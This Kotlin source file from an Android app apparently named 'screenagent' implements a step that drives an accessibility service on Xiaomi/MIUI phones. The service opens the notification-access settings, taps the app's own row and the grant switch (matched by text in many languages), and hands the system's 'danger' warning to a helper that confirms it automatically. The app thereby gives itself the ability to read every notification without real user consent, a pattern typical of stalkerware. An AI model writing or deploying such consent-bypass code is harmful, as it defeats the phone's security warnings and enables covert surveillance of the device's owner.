package com.zaka.screenagent.flow.miui

import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService
import com.zaka.screenagent.notify.NotificationAccessActivator

/**
 * 第四步：通知使用权（小米）
 *
 *   ① 已授权就跳过
 *   ② 打开「设备和应用通知」设置页（ACTION_NOTIFICATION_LISTENER_SETTINGS）
 *   ③ 列表页点自己那一行 → 详情页点「授予通知使用权」开关
 *   ④ 若弹「危险」页 → 交给 MiuiNavigator 处理（2s 勾选 / 10s 确定）
 *   ⑤ 校验 enabled_notification_listeners（系统绑定有 ~10 秒延迟）
 */
object Step4 {

    private const val TAG = "Step4"
    private val ui = Handler(Looper.getMainLooper())

    /** 开关/行文案（多语言） */
    private val GRANT_TEXTS = listOf(
        "授予通知使用权", "允许通知访问权限", "通知使用权",
        "Allow notification access", "Notification access", "Grant notification access",
        "Permitir acceso a notificaciones", "Acceso a notificaciones",
        "Permitir acesso a notificações", "Akses notifikasi",
        "Cho phép truy cập thông báo", "อนุญาตการเข้าถึงการแจ้งเตือน",
        "السماح بالوصول إلى الإشعارات", "বিজ্ঞপ্তি অ্যাক্সেস"
    )

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        if (NotificationAccessActivator.isGranted(service)) {
            Log.d(TAG, "已授权，跳过")
            onDone(true); return
        }
        Log.d(TAG, "打开通知使用权设置页")
        openPage(service, 1)

        var ticks = 0
        var rowClicked = false
        var toggleClicked = false
        var riskHandled = false

        fun tick() {
            // 已授权 → 立刻结束（这是唯一的成功判据）
            if (NotificationAccessActivator.isGranted(service)) {
                Log.d(TAG, "已授权")
                onDone(true); return
            }
            if (!rowClicked) {
                if (MiuiNavigator.clickByText(service, appLabel(service), contains = false)) {
                    rowClicked = true
                    Log.d(TAG, "点到自己那一行")
                }
            } else if (!toggleClicked) {
                var hit = false
                for (t in GRANT_TEXTS) {
                    if (MiuiNavigator.clickByText(service, t, contains = true)) { hit = true; break }
                }
                if (!hit) hit = clickFirstSwitch(service)
                if (hit) {
                    toggleClicked = true
                    Log.d(TAG, "点了允许开关 → 交给危险页函数")
                    // 点开关必然弹危险页：直接交给危险页函数处理
                    MiuiNavigator.passRiskDialog(service) { }
                    riskHandled = true
                }
            }
            if (ticks++ > 40) {
                val g = NotificationAccessActivator.isGranted(service)
                Log.w(TAG, "超时 granted=$g")
                onDone(g); return
            }
            ui.postDelayed({ tick() }, 1_500L)
        }
        ui.postDelayed({ tick() }, 4_000L)
    }

    private fun openPage(service: BoundaryAccessibilityService, attempt: Int) {
        runCatching {
            service.startActivity(
                Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
        }.onFailure { Log.w(TAG, "打开设置页失败 $it") }
        if (attempt < 4) {
            ui.postDelayed({
                if (!NotificationAccessActivator.isGranted(service) && !onNotificationPage(service)) {
                    openPage(service, attempt + 1)
                }
            }, 2_000L)
        }
    }

    private fun onNotificationPage(service: BoundaryAccessibilityService): Boolean {
        val cls = runCatching { service.rootInActiveWindow?.className?.toString().orEmpty() }.getOrDefault("")
        return cls.contains("NotificationAccess")
    }

    private fun appLabel(service: BoundaryAccessibilityService): String = runCatching {
        service.packageManager.getApplicationLabel(service.applicationInfo).toString()
    }.getOrDefault("love")

    /** 点当前页第一个未开启的开关（仅用于详情页，列表页不要调） */
    private fun clickFirstSwitch(service: BoundaryAccessibilityService): Boolean {
        val root = service.rootInActiveWindow ?: return false
        val sw = findSwitch(root, 0) ?: return false
        if (sw.isChecked) return true
        return MiuiNavigator.tapByGesture(service, sw)
    }

    private fun findSwitch(n: AccessibilityNodeInfo?, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        if (n.className?.toString()?.contains("Switch") == true) return n
        for (i in 0 until n.childCount) findSwitch(n.getChild(i), d + 1)?.let { return it }
        return null
    }
}
